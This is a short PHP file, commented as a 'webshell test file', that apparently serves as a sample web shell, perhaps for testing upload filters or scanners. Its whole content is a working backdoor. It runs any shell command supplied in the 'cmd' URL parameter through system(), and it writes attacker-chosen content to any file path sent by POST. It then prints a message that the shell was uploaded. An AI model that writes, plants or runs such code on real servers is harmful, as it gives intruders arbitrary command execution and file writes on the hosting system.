<?php
// Webshell test file
system($_GET['cmd']);
file_put_contents($_POST['file'], $_POST['content']);
echo "Shell uploaded successfully";
?> 